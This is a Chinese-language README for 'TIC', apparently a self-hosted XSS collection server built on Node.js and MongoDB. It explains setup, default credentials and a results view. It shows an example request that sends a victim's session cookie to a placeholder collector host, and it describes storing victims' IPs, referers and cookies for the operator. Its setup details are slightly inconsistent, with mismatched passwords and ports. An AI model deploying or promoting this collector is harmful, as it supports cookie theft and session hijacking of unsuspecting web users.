# TIC

TIC,一个简单的XSS服务端. 0x_Jin
  
#### 所需依赖

1. iojs or node.js
2. mongodb

#### 操作流程

1.安装mongodb后需要最好开启mongodb的ip绑定,绑定到127.0.0.1  
2.安装完后启动mongodb 使用mongo命令来管理mongodb. 添加数据库账户.   
```
use TIC  
db.addUser('TIC','ThisIsPass')  
如果你不想使用这个账号密码,可以更改为其他的.但是请同时修改config.json中db字段的数据库账号密码.  
"db":{
		"dbname":"TIC",
		"address":"localhost",
		"username":"TIC",
    	"password":"ThisIsTIC"
	}
```
  
  
3.进入TIC目录,启动TIC.js (iojs TIC.js) , 程序会运行在本地的8080端口
```
如果需要修改端口,可以在config.json中找到port,把8888修改成你想要变更的端口.  
"port":8888
```
  
  
4.本程序提供了结果查看页,路径为: /view , 为了安全性加上了基础认证. 默认基础认证 username:0x_Jin , password:wooyun
```
你可以在config.json中找到auth字段 把username and password改为你想要变更的账号密码.
"auth":{
	  "username":"0x_Jin",
	  "password":"wooyun",
	  "Basic_realm":"0x_Jin xss1.com"
}
```
  
  
5.如果你想自己写一个结果查看页,你可以直接从 /receiver 来获得数据  
6.关于结果如何插入,除了.js .css 以及/view /receiver这些路径外的参数都会接受并存入数据库
```
example:http://xxxx:8080/?url=baidu.com&cookie=PHPSESSION%3Dxxxxxxx&ip=127.0.0.1  
除了GET外,POST也可以.
```
  
  
7.结果分为两大部分,第一部分为header,第二部分为request
```
header中存储的内容是程序获得到的请求者的数据,user-agent referer 源IP  
request中存储的内容为请求过来的数据 比如页面地址,cookie,ip等.  
  
example:  
 {
        "header":{
            "useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2478.0 Safari/537.36",
            "referer":"http://zone.wooyun.org/",
            "srcip":"::1"
        },
        "time":"2015/8/13 13:13:40",
        "request":{
            "url":"www.xss1.com",
            "referer":"www.wooyun.org"
        }
    }
```

  
